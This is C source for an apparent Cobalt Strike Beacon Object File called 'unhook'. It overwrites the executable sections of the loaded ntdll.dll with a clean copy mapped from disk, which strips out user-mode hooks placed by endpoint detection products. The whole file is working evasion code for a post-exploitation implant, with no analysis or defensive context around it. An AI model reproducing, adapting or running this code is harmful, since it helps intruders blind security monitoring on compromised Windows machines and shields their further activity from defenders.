/*
 * unhook - restore ntdll's executable sections from a clean on-disk copy.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    const char *path = "C:\\Windows\\System32\\ntdll.dll";
    HMODULE ntdll;
    HANDLE file, mapping;
    LPVOID image;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;
    int patched = 0;
    (void)args; (void)alen;

    ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        BeaconPrintf(CALLBACK_ERROR, "ntdll.dll not loaded\n");
        return;
    }

    file = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        return;
    }

    mapping = KERNEL32$CreateFileMappingA(file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!mapping) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileMapping failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(file);
        return;
    }

    image = KERNEL32$MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!image) {
        BeaconPrintf(CALLBACK_ERROR, "MapViewOfFile failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(mapping);
        KERNEL32$CloseHandle(file);
        return;
    }

    dos = (PIMAGE_DOS_HEADER)image;
    nt = (PIMAGE_NT_HEADERS)((BYTE *)image + dos->e_lfanew);
    sec = IMAGE_FIRST_SECTION(nt);

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            LPVOID dst = (LPVOID)((BYTE *)ntdll + sec[i].VirtualAddress);
            DWORD old = 0;
            DWORD size = sec[i].Misc.VirtualSize;
            if (KERNEL32$VirtualProtect(dst, size, PAGE_EXECUTE_READWRITE, &old)) {
                bof_memcpy(dst, (BYTE *)image + sec[i].VirtualAddress, size);
                KERNEL32$VirtualProtect(dst, size, old, &old);
                patched++;
            }
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Restored %d executable section(s) of ntdll.dll\n", patched);
    KERNEL32$UnmapViewOfFile(image);
    KERNEL32$CloseHandle(mapping);
    KERNEL32$CloseHandle(file);
}
